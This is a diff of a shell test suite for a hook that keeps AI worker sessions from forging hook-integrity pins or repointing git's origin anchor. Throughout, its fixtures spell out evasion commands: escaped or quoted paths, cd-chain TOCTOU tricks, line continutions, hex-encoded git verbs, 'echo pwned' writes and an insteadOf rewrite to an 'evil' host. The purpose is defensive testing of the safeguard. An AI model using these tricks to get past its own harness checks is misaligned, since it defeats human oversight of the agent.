     "$(run_case "$PIN_CD_FAIL_JSON" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"
 
-# --- HIMMEL-2200 pr-check critic-panel re-review (codex-1): the backslash
+# --- The backslash
 # handling added above was itself too broad -- it fired unconditionally even
 # when the mediated tool is PowerShell (backslash is an ordinary literal
 # character there, never an escape), stripping the separators out of a native
@@ -949,8 +944,8 @@ case "${OSTYPE:-$(uname -s 2>/dev/null || echo unknown)}" in
         ;;
 esac
 
-# --- HIMMEL-2200 pr-check critic-panel re-review ROUND 3 (codex-1): the
-# cd-existence `test -d` probe (round 2's fix, since replaced) reflected
+# --- The retired cd-existence `test -d` probe
+# reflected
 # filesystem state at HOOK-SCAN time, before any segment of the multi-segment
 # command has executed -- a real, concrete TOCTOU. `rmdir real; cd real; bash
 # forge.sh`: at scan time `real` genuinely exists, so a scan-time probe says
@@ -974,14 +969,14 @@ PIN_TOCTOU_JSON=$(jq -n --arg cmd "rmdir real; cd real; bash forge.sh" --arg cwd
 assert_rc "pin-dir write denied via rmdir-then-cd TOCTOU on an existing target (HIMMEL-2200 pr-check panel round 3 codex-1)" 2 \
     "$(run_case "$PIN_TOCTOU_JSON" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"
 
-# --- HIMMEL-2200 pr-check critic-panel re-review ROUND 5 (codex-1): the
-# candidate-set fork model (round 4) capped growth at MAXCAND by keeping the
+# --- The candidate-set fork model
+# capped growth at MAXCAND by keeping the
 # FIRST MAXCAND entries of the de-duped set -- but that set is built
 # unchanged-block-first, advanced-block-second, so a plain first-N truncation
 # systematically dropped EVERY "cd succeeds" candidate once enough distinct
 # cd targets accumulated (candidates roughly double per distinct cd; MAXCAND=32
 # means the 6th distinct cd is the first to overflow and get truncated),
-# silently reopening the exact fork-model gap round 4 exists to close. Fixed
+# silently reopening the exact fork-model gap it exists to close. Fixed
 # by truncating BALANCED -- up to half the cap from each block -- so a real
 # execution path can never be dropped just because it was pushed second. This
 # fixture chains 6 distinct cd targets, with the real payload only at the
@@ -997,13 +992,13 @@ PIN_CHAIN_JSON=$(jq -n --arg cmd "cd $PIN_CHAIN_DIR/d1; cd ../d2; cd ../d3; cd .
 assert_rc "pin-dir write denied via 6 distinct cds overflowing MAXCAND (HIMMEL-2200 pr-check panel round 5 codex-1)" 2 \
     "$(run_case "$PIN_CHAIN_JSON" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"
 
-# --- HIMMEL-2214: `&&`/`||` short-circuit truthiness. The tokenizer segments
+# --- `&&`/`||` short-circuit truthiness. The tokenizer segments
 # on a bare `;`/`&`/`|` and has no notion of AND/OR short-circuit, so it models
 # `false && cd existing` as if the cd ran while a real shell skips it and stays
-# put. Against the pre-HIMMEL-2200 tokenizer (single modeled cwd, advanced
+# put. Against the earlier tokenizer (single modeled cwd, advanced
 # unconditionally) that was a real fail-OPEN: the model moved into `existing`
 # and never scanned the forge.sh actually sitting at the ORIGINAL cwd. The
-# HIMMEL-2200 fork model SUBSUMES it -- a cd forks rather than replaces, and a
+# The fork model SUBSUMES it -- a cd forks rather than replaces, and a
 # cd skipped by short-circuit is indistinguishable from a cd that ran and
 # failed, which is exactly the preserved unchanged candidate. Verified
 # both-direction against `git show 2bab2305:scripts/hooks/block-glm-external-writes.sh`
@@ -1026,12 +1021,12 @@ PIN_SHORTCIRCUIT_OK_JSON=$(jq -n --arg cmd 'false && cd existing; bash forge.sh'
 assert_rc "short-circuit shape with benign script content still allowed (HIMMEL-2214 negative control)" 0 \
     "$(run_case "$PIN_SHORTCIRCUIT_OK_JSON" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"
 
-# --- HIMMEL-2218 [codex-2]: PowerShell's escape character is the BACKTICK, and
+# --- PowerShell's escape character is the BACKTICK, and
 # the tokenizer modelled no PowerShell escape at all -- so a backtick-escaped
 # separator inside an UNQUOTED PowerShell path was treated as a real segment
 # boundary, truncating the token to a path that matches no file, and the real
 # script went unscanned (fail-OPEN). Reuses the `forge;payload.sh` fixture: the
-# quoted spelling of this same path is the HIMMEL-2200 codex-1 case above, so
+# quoted spelling of this same path is the case above, so
 # the pair isolates dialect escape handling from quote handling.
 # A literal backtick, assembled once so the fixtures below stay readable.
 PIN_BT='`'
@@ -1039,7 +1034,7 @@ PIN_PWSH_ESCSEP_CMD="bash ${PIN_SCRIPT_DIR_NATIVE}/forge${PIN_BT};payload.sh"
 assert_rc "pin-dir write denied via a backtick-escaped separator in an unquoted PowerShell path (HIMMEL-2218 codex-2)" 2 \
     "$(run_case "$(j_pwsh "$PIN_PWSH_ESCSEP_CMD")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"
 
-# --- HIMMEL-2218 [codex-3]: a bash backslash-newline (or PowerShell
+# --- a bash backslash-newline (or PowerShell
 # backtick-newline) line continuation joins two PHYSICAL lines into ONE logical
 # command before the real shell parses it. Each awk input record is one
 # physical line, so a script path split across a continuation used to extract
@@ -1059,7 +1054,7 @@ PIN_CONT_EVEN_CMD=$(printf 'bash %s/for\\\\\nge.sh' "$PIN_SCRIPT_DIR")
 assert_rc "an even run of trailing backslashes is not a line continuation (HIMMEL-2218 codex-3 control)" 0 \
     "$(run_case "$(j_bash "$PIN_CONT_EVEN_CMD")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"
 
-# --- HIMMEL-2218 [codex-3], CodeRabbit review on PR #2005: CRLF line endings.
+# --- CRLF line endings.
 # AWK splits records on \n, so a command submitted with CRLF keeps the \r at
 # the END of every record -- which means the escape character continuing the
 # line is no longer the LAST character and the continuation join never fires.
@@ -1081,8 +1076,7 @@ PIN_CRLF_BENIGN_CMD=$(printf 'bash %s/beni\\%s\ngn.sh' "$PIN_SCRIPT_DIR" "$PIN_C
 assert_rc "CRLF line continuation to a benign script still allowed (HIMMEL-2218 codex-3 control)" 0 \
     "$(run_case "$(j_bash "$PIN_CRLF_BENIGN_CMD")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"
 
-# --- HIMMEL-2218 expansion (console ruling, same scanner region and the same
-# fail-open direction as codex-2): PowerShell embeds a literal quote inside a
+# --- PowerShell embeds a literal quote inside a
 # single-quoted string by DOUBLING it, so the doubled pair is one literal
 # character in the token -- not a close followed by a reopen. Reading it as
 # close-then-reopen dropped the quote character and produced a path matching no
@@ -1100,7 +1094,7 @@ PIN_BASH_SQ_CMD="bash '${PIN_SCRIPT_DIR}/it''s forge.sh'"
 assert_rc "bash adjacent-quote concatenation semantics unchanged by the pwsh doubling rule (HIMMEL-2218 expansion control)" 0 \
     "$(run_case "$(j_bash "$PIN_BASH_SQ_CMD")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"
 
-# --- HIMMEL-2218 [codex-2], pr-check panel ROUND 2: modelling only the
+# --- Modelling only the
 # self-escaping trio (backtick, dollar, double-quote) was not enough. In
 # PowerShell the backtick ALWAYS escapes: `n `t `r `a `b `f `v stand for control
 # characters, `0 for NUL, and for ANY other character the backtick is simply
@@ -1126,7 +1120,7 @@ printf 'echo pwned > "%s/forged.json"\n' "$PIN_FIXTURE" > "$PIN_PWSH_TAB_FORGE"
 assert_rc "pin-dir write denied when a PowerShell \`t resolves to a real tab in the path (HIMMEL-2218 codex-2, panel round 2)" 2 \
     "$(run_case "$(j_pwsh "bash \"${PIN_SCRIPT_DIR_NATIVE}/for${PIN_BT}tge.sh\"")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"
 
-# --- HIMMEL-2218 [codex-1], pr-check panel ROUND 3: PowerShell's
+# --- PowerShell's
 # VARIABLE-LENGTH escape, `u{...}. Expectations here are not inferred from
 # docs -- they were taken from a real PowerShell 7.6.5, which resolves
 # "`u{66}orge" AND bare `u{66}orge alike to forge. So `u{66}orge.sh genuinely
@@ -1148,7 +1142,7 @@ assert_rc "a \`u{...} escape resolving to a benign script is still allowed (HIMM
 assert_rc "a malformed \`u{zz} is not treated as a unicode escape (HIMMEL-2218 codex-1 control)" 0 \
     "$(run_case "$(j_pwsh "bash \"${PIN_SCRIPT_DIR_NATIVE}/${PIN_BT}u{zz}orge.sh\"")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"
 
-# --- COMPLETENESS BY ENUMERATION (operator directive, PR #2005 round 3).
+# --- COMPLETENESS BY ENUMERATION.
 # The PowerShell backtick grammar is FINITE, so the resolver is closed by
 # enumerating it rather than by waiting to see whether another review round
 # finds a hole. Every expectation below was read off a real PowerShell 7.6.5:
@@ -1163,7 +1157,7 @@ assert_rc "a malformed \`u{zz} is not treated as a unicode escape (HIMMEL-2218 c
 # above. The enumeration was written out by hand instead of derived from
 # about_Special_Characters, so it reproduced the author-s blind spot -- the
 # exact failure mode enumeration was supposed to prevent. `e is deferred to
-# HIMMEL-2236 with the >255-codepoint issue; a fix there should extend these
+# a follow-up with the >255-codepoint issue; a fix there should extend these
 # cases from the language reference, not from another hand-written list.
 #
 # One case per form. The control sequences are asserted in the NEGATIVE
@@ -1201,7 +1195,7 @@ assert_rc "pin-dir write denied via a PowerShell \`\$ escape (literal dollar in 
 assert_rc "a PowerShell \`\" escape does not terminate the quoted path (escape-grammar enumeration)" 0 \
     "$(run_case "$(j_pwsh "bash \"${PIN_ESC_DIR_NATIVE}/forge.sh${PIN_BT}\";echo hi\"")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"
 
-# --- pr-check panel ROUND 4 [codex-2]: the NUL filter has to sit on the
+# --- The NUL filter has to sit on the
 # EMITTED path, not on the token. A NUL can also arrive through the modeled
 # CWD -- `cd path`0suffix` puts one in a candidate directory -- and the
 # token-only test let that through, whereupon the bash reader silently dropped
@@ -1219,7 +1213,7 @@ assert_rc "a NUL reaching the modeled cwd is not repaired into a real directory 
 assert_rc "the same cd chain through the real directory still denies (panel round 4 codex-2 control)" 2 \
     "$(run_case "$(j_pwsh "cd ${PIN_CDNUL_DIR_NATIVE}/sub; bash forge.sh")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"
 
-# --- HIMMEL-3177 CodeRabbit thread on the BSD-awk NUL fallback. BSD awk cannot
+# --- The BSD-awk NUL fallback. BSD awk cannot
 # build a NUL, so the pin scan stands the printable marker SOH NUL SOH in for
 # one. Unlike a NUL that marker is a LEGAL filename: a real payload script named
 # with it would be filtered out as "holds a NUL" and never scanned (an
@@ -1245,7 +1239,7 @@ assert_rc "an unrelated PowerShell \`u{2} escape is not caught by the marker gua
 assert_rc "an ordinary command with no marker is still allowed (HIMMEL-3177 control)" 0 \
     "$(run_case "$(j_bash "echo hi")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"
 
-# --- pr-check panel ROUND 2 [codex-1], adjudicated DISPROVED as a bypass but
+# --- Adjudicated DISPROVED as a bypass but
 # pinned here so it stays disproved. The claim was that the continuation join
 # can replace a real script path and let a write through. For any command a
 # shell will actually EXECUTE, the join preserves detection: the interpreter and
@@ -1262,7 +1256,7 @@ PIN_JOIN_SEG_CMD=$(printf "bash '%s/a\\\\\nb'; bash %s/forge.sh" "$PIN_SCRIPT_DI
 assert_rc "a closed quote across a continuation still ends its segment (panel round 2 codex-1)" 2 \
     "$(run_case "$(j_bash "$PIN_JOIN_SEG_CMD")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"
 
-# --- HIMMEL-2225 (pr-check critic-panel round 6 [codex-1]): the candidate set
+# --- The candidate set
 # used to be built as an unchanged BLOCK followed by an advanced BLOCK, so
 # once MAXCAND was reached the first-N truncation dropped the advanced block
 # wholesale -- i.e. every "the latest cd succeeded, but an earlier one did not"
@@ -1282,7 +1276,7 @@ PIN_INTERLEAVE_JSON=$(jq -n --arg cmd 'cd d1; cd d2; cd d3; cd d4; cd d5; cd d6;
 assert_rc "pin-dir write denied on a partial-failure cd branch past MAXCAND (HIMMEL-2225 round 6 codex-1)" 2 \
     "$(run_case "$PIN_INTERLEAVE_JSON" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"
 
-# codex-1 (pr-check critic-panel ROUND 2): a CUSTOM pin dir configured in one
+# A CUSTOM pin dir configured in one
 # drive-letter spelling (POSIX) must still be caught when the worker's command
 # references the SAME directory in the OTHER spelling (native/Windows) --
 # cross-spelling, unlike the same-spelling-both-sides case above. Rooted under
@@ -1296,7 +1290,7 @@ PIN_CROSS_DIR_NATIVE=$(native_dir "$PIN_CROSS_DIR")
 assert_rc "pin-dir write denied via cross-spelling custom dir (codex-1 round 2)" 2 \
     "$(run_case "$(j_bash "echo pwned > $PIN_CROSS_DIR_NATIVE/forged.json")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_CROSS_DIR")"
 
-# codex-1 (pr-check critic-panel round 1): matching only the RESOLVED absolute
+# Matching only the RESOLVED absolute
 # path missed the shell expanding an UNEXPANDED variable reference at
 # execution time — the command text never contains the resolved path as a
 # literal substring, so the original check alone missed it. A custom pin-dir
@@ -1304,7 +1298,7 @@ assert_rc "pin-dir write denied via cross-spelling custom dir (codex-1 round 2)"
 # the var-name branch from the fixed-suffix branch below.
 PIN_VAR_CUSTOM_DIR=$(mktemp -d -t pin-custom.XXXXXX)
 
-# codex-2 (pr-check critic-panel round 2): PowerShell's canonical $env:X /
+# PowerShell's canonical $env:X /
 # ${env:X} scope-qualified variable syntax must be denied too -- the round-1
 # fix only matched bash-style $X / ${X}.
 # shellcheck disable=SC2016  # literal unexpanded PowerShell $env: reference is the command text under test
@@ -1332,7 +1326,7 @@ assert_rc "pin-dir write denied via unexpanded \$HOME default-path reference (co
 assert_rc "pin-dir write denied on the GLM lane too (new class extends it)" 2 \
     "$(run_case "$(j_bash "$PIN_WRITE_CMD")" "ANTHROPIC_BASE_URL=$GLM_URL" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"
 
-# HIMMEL-3396: the bypass is honoured only inside a linked worktree of the
+# The bypass is honoured only inside a linked worktree of the
 # session's recorded repo (positive controls: test-block-glm-bypass-scope.sh);
 # this suite runs from the primary/CI checkout, where it must NOT disable the fence.
 assert_rc "pin-dir write STILL denied under the bypass outside a linked worktree (HIMMEL-3396)" 2 \
@@ -1340,7 +1334,7 @@ assert_rc "pin-dir write STILL denied under the bypass outside a linked worktree
 
 # Scope boundary: a native worker gets ONLY the pin-dir class. The rest of
 # this file's GLM-specific enforcement (push/gh/network) does not extend to
-# it — HIMMEL-2085 asked for the hook-integrity surface, not a full GLM-lane
+# it — the pin-dir class covers the hook-integrity surface, not a full GLM-lane
 # replica for native workers.
 assert_rc "native worker git push NOT blocked by this hook (out of HIMMEL-2085 scope)" 0 \
     "$(run_case "$(j_bash 'git push origin main')" "HIMMEL_WORKER=1")"
@@ -1351,12 +1345,12 @@ assert_rc "native worker unrelated command allowed" 0 \
 assert_rc "glm lane git push still blocked (regression pin)" 2 \
     "$(run_case "$(j_bash 'git push origin main')" "ANTHROPIC_BASE_URL=$GLM_URL")"
 
-# --- HIMMEL-2528: anchor-tamper fence (origin/<default> repoint) -------------
+# --- anchor-tamper fence (origin/<default> repoint) -------------
 # Every DENY row below runs on a NATIVE worker lane (HIMMEL_WORKER=1, no
 # ANTHROPIC_BASE_URL) — the exact case cmd_lc (set only past the glm_lane-only
 # exit at :877 in the pre-2528 file) cannot reach, and a row that only
 # exercised the GLM lane would be vacuous for this class's whole reason to
-# exist (worker-ness, not lane — same as the HIMMEL-2085 class above).
+# exist (worker-ness, not lane — same as the pin-dir class above).
 assert_rc "anchor-tamper: local-path fetch with a bare refspec" 2 \
     "$(run_case "$(j_bash 'git fetch . x:origin/main')" "HIMMEL_WORKER=1")"
 assert_rc "anchor-tamper: local-path fetch with a HEAD:refs/remotes refspec" 2 \
@@ -1380,8 +1374,8 @@ assert_rc "anchor-tamper: remote set-head" 2 \
 assert_rc "anchor-tamper: insteadOf remote-URL rewrite" 2 \
     "$(run_case "$(j_bash 'git -c url.https://evil/.insteadOf=https://github.com/ fetch origin')" "HIMMEL_WORKER=1")"
 
-# HIMMEL-2528 round 2: `remote remove` / `remote rm` / `remote rename` were
-# named in this ticket's threat model but left out of the prescribed class (i)
+# `remote remove` / `remote rm` / `remote rename` were
+# named in the threat model but left out of the prescribed class (i)
 # fence list, so all three measured rc=0 ALLOW while `add` and `set-url`
 # denied. They matter to class (ii) as well as class (i): removing or renaming
 # `origin` collapses the configured-remote set the destination gate consults,
@@ -1423,7 +1417,7 @@ assert_rc "anchor-tamper codex-6: double-quoted dot remote via git push" 2 \
 assert_rc "anchor-tamper codex-6: quoting composes with git -C <dir>" 2 \
     "$(run_case "$(j_bash 'git -C /some/dir fetch "." x:origin/main')" "HIMMEL_WORKER=1")"
 
-# HIMMEL-2528 bare-".." gap (same class as codex-6, found verifying the fix
+# Bare-".." gap (same class as codex-6, found verifying the fix
 # above rather than reported by the panel): the original alternation covered
 # `.` bare but `..` only with a trailing `/…`, so `git fetch .. x:origin/main`
 # — naming the PARENT directory as the remote, exactly as usable for anchor
@@ -1444,7 +1438,7 @@ assert_rc "anchor-tamper HIMMEL-2528: bare .. remote via git push" 2 \
 assert_rc "anchor-tamper HIMMEL-2528: bare .. composes with git -C <dir>" 2 \
     "$(run_case "$(j_bash 'git -C /some/dir fetch .. x:origin/main')" "HIMMEL_WORKER=1")"
 
-# HIMMEL-2528 round 2 — the destination gate. Class (ii) used to match on the
+# The destination gate. Class (ii) used to match on the
 # REMOTE argument, and that axis lost four times: quoted remotes (codex-6),
 # bare `..`, then codex-3's bare relative directory names, then the CONFIGURED
 # remote itself. The last two were both measured rc=0 ALLOW pre-fix:
@@ -1559,14 +1553,14 @@ assert_rc "anchor-tamper codex-6: quoted ordinary remote name still allowed" 0 \
 assert_rc "anchor-tamper codex-6: commit message quoting a dot stays allowed" 0 \
     "$(run_case "$(j_bash 'git commit -m "fix: normalize \". path"')" "HIMMEL_WORKER=1")"
 
-# HIMMEL-2528 bare-".." negative control: a bare ".." appearing OUTSIDE the
+# Bare-".." negative control: a bare ".." appearing OUTSIDE the
 # remote-argument position of a fetch/push/pull (here, plain prose in a commit
 # message) must not trip the new alternative — it only fires at the same
 # command-position slot the rest of class (ii) already anchors on.
 assert_rc "anchor-tamper HIMMEL-2528: commit message mentioning .. stays allowed" 0 \
     "$(run_case "$(j_bash 'git commit -m "see ../notes for detail"')" "HIMMEL_WORKER=1")"
 
-# HIMMEL-2528 round 2 negative controls. Inverting class (ii) from the remote
+# Negative controls. Inverting class (ii) from the remote
 # argument to the refspec destination is exactly the change that over-blocks,
 # so the ALLOW side is pinned as hard as the DENY side. The first three are the
 # implicit-refspec forms: they DO update tracking refs, via the remote's
@@ -1613,8 +1607,8 @@ assert_rc "anchor-tamper round 2: commit message naming origin/main allowed" 0 \
 assert_rc "anchor-tamper round 2: fetch chained with such a commit stays allowed" 0 \
     "$(run_case "$(j_bash 'git fetch origin; git commit -m "fix: origin/main drift"')" "HIMMEL_WORKER=1")"
 
-# --- HIMMEL-2528 round 3, codex-2: class (i) quoting bypass ------------------
-# Round 1 gave class (ii) anchor_unquote() and left class (i) scanning RAW
+# --- class (i) quoting bypass ------------------
+# Class (ii) had anchor_unquote() while class (i) scanned RAW
 # command text, so every class-(i) keyword walked through an ordinary shell
 # quoting form. All 17 rows below measured rc=0 ALLOW against the pre-fix hook
 # (628bd627) and rc=2 DENY after — the red control was the real normalization
@@ -1665,7 +1659,7 @@ assert_rc "class (i) quoting: refs/remotes path split by a quote" 2 \
 assert_rc "class (i) quoting: remotes/origin path split by a quote" 2 \
     "$(run_case "$(j_bash "printf x > .git/refs/'remotes/origin'/main")" "HIMMEL_WORKER=1")"
 
-# ANSI-C ($'...') fail-closed arm, widened in round 3 from class (ii)'s
+# ANSI-C ($'...') fail-closed arm, widened from class (ii)'s
 # fetch/push/pull segment to any command-position git segment. anchor_unquote()
 # does not decode escape bodies (a wrong decode risks a false ALLOW), so a body
 # that spells a keyword out in hex survives normalization: both rows measured
@@ -1677,11 +1671,11 @@ assert_rc "class (i) ANSI-C: hex-encoded remote subcommand" 2 \
     "$(run_case "$(j_bash "git \$'\\x72emote' add evil /tmp/d")" "HIMMEL_WORKER=1")"
 
 # --- class (i) precondition for the destination gate -------------------------
-# MECHANICAL coupling pin, not a comment (HIMMEL-2528 round 3). Class (ii)
+# MECHANICAL coupling pin, not a comment. Class (ii)
 # deliberately ALLOWS the implicit-refspec form `git fetch origin` — pinned
 # just above as "anchor-tamper: plain git fetch origin allowed", and it must
 # stay allowed. That makes class (i) the ONLY thing preventing the two-step
-# anchor forgery below, and until round 3 it held for bare spellings alone:
+# anchor forgery below, and it once held for bare spellings alone:
 # the whole chain measured rc=0 ALLOW against the pre-fix hook.
 #
 # Read these two rows together with that ALLOW row. If a future edit
@@ -1707,11 +1701,11 @@ assert_rc "class (i) quoting: git remote get-url origin allowed" 0 \
 assert_rc "class (i) ANSI-C: non-git command using \$'...' allowed" 0 \
     "$(run_case "$(j_bash "echo \$'a\\nb'")" "HIMMEL_WORKER=1")"
 
-# ACCEPTED OVERMATCH, pinned as the two rows that CHANGED DIRECTION in round 3
+# ACCEPTED OVERMATCH, pinned as the two rows that CHANGED DIRECTION
 # (rc=0 ALLOW pre-fix, rc=2 DENY now). Recorded honestly rather than argued
 # away: class (i) is an unanchored substring scan, so a commit MESSAGE naming a
-# fenced phrase already denied before this round — see "glm prose remote
-# set-url (HIMMEL-2528 accepted overmatch)" near the top of this file, which
+# fenced phrase already denied before this change — see the "glm prose remote
+# set-url" accepted-overmatch row near the top of this file, which
 # pins the UNQUOTED spelling at rc=2 and predates the change. Normalization
 # extends that same accepted cost to the quoted spelling; it does not create a
 # new category of false positive, and no substring class can tell
@@ -1722,7 +1716,7 @@ assert_rc "class (i) accepted overmatch: commit message quoting a fenced verb" 2
 assert_rc "class (i) accepted overmatch: commit message using \$'...'" 2 \
     "$(run_case "$(j_bash "git commit -m \$'a\\nb'")" "HIMMEL_WORKER=1")"
 
-# --- HIMMEL-2528 round 4, codex-2: options between `remote` and its verb -----
+# --- options between `remote` and its verb -----
 # `git remote` takes options BEFORE the subcommand, so `remote[[:space:]]+add`
 # never saw the verb. All eight rows below measured rc=0 ALLOW against the
 # pre-fix hook (ddd23b07) and rc=2 DENY after; the red control was the real
@@ -1754,13 +1748,13 @@ assert_rc "class (i) remote options: --verbose before set-head" 2 \
 # tolerating exactly one — a one-token allowance would leave this open.
 assert_rc "class (i) remote options: two options before add" 2 \
     "$(run_case "$(j_bash 'git remote -v --verbose add evil /tmp/d')" "HIMMEL_WORKER=1")"
-# BOTH round-3 and round-4 axes at once: an intervening option AND a quoted
-# verb. Round 3's normalizer alone does not reach it and round 4's tokeniser
+# BOTH the quoting and the option axes at once: an intervening option AND a quoted
+# verb. The quote normalizer alone does not reach it and the remote-verb tokeniser
 # alone does not either — only both together deny.
 assert_rc "class (i) remote options: --verbose before a quoted set-url" 2 \
     "$(run_case "$(j_bash "git remote --verbose 'set-url' origin /tmp/evil.git")" "HIMMEL_WORKER=1")"
 
-# --- HIMMEL-2528 round 4, codex-3: quote-evadable ANSI-C command anchor ------
+# --- quote-evadable ANSI-C command anchor ------
 # The ANSI-C arm must scan UNNORMALIZED text (anchor_unquote() strips the `'`
 # the `$'` marker is made of), but it anchored on a LITERAL unquoted `git` at
 # command position — so quoting the command token walked past both it and the
@@ -1779,13 +1773,13 @@ assert_rc "class (i) ANSI-C: backslash-escaped git command token" 2 \
 assert_rc "class (i) ANSI-C: quoted git at a chained segment position" 2 \
     "$(run_case "$(j_bash "true; \"git\" remote \$'\\x61dd' evil /tmp/d")" "HIMMEL_WORKER=1")"
 
-# ALLOW controls for round 4. A tokeniser over-blocks easily, and the sharp
+# ALLOW controls. A tokeniser over-blocks easily, and the sharp
 # edge is `git remote -v` with NO verb after it: that is a LISTING, not a
 # metadata write. "First non-option token" yields nothing there, so nothing is
 # compared against the verb list and the row stays allowed. `git remote`,
 # `git remote -v`, `git remote show origin`, `git remote get-url origin`,
 # `git status`, `git fetch origin` and `git push origin feat/x` are each pinned
-# elsewhere in this file; these are the three round 4 adds.
+# elsewhere in this file; these are the three added.
 assert_rc "class (i) remote options: git remote --verbose (listing) allowed" 0 \
     "$(run_case "$(j_bash 'git remote --verbose')" "HIMMEL_WORKER=1")"
 assert_rc "class (i) remote options: -v before a read-only verb allowed" 0 \
@@ -1795,7 +1789,7 @@ assert_rc "class (i) remote options: -v before a read-only verb allowed" 0 \
 assert_rc "class (i) ANSI-C: quoted git without \$'...' allowed" 0 \
     "$(run_case "$(j_bash '"git" status')" "HIMMEL_WORKER=1")"
 
-# --- HIMMEL-2528 round 5, codex-1: line continuations ------------------------
+# --- line continuations ------------------------
 # The SEVENTH axis this fence's matching has been defeated on, and again closed
 # by REMOVING the axis rather than enumerating its members. Bash deletes a
 # backslash-newline pair before parsing, so `git remote \<newline>set-url origin
@@ -1873,7 +1867,7 @@ assert_rc "class (i) continuation: an even trailing run keeps the command bounda
 assert_rc "anchor-tamper: DENY-shaped command allowed off-lane (headed session)" 0 \
     "$(run_case "$(j_bash 'git fetch . x:origin/main')")"
 
-# HIMMEL-3396: the bypass no longer lets a DENY-shaped command through outside a
+# The bypass no longer lets a DENY-shaped command through outside a
 # linked worktree (positive controls: test-block-glm-bypass-scope.sh).
 assert_rc "anchor-tamper: DENY-shaped command STILL denied under the bypass outside a linked worktree (HIMMEL-3396)" 2 \
     "$(run_case "$(j_bash 'git fetch . x:origin/main')" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_BYPASS_OK=1")"
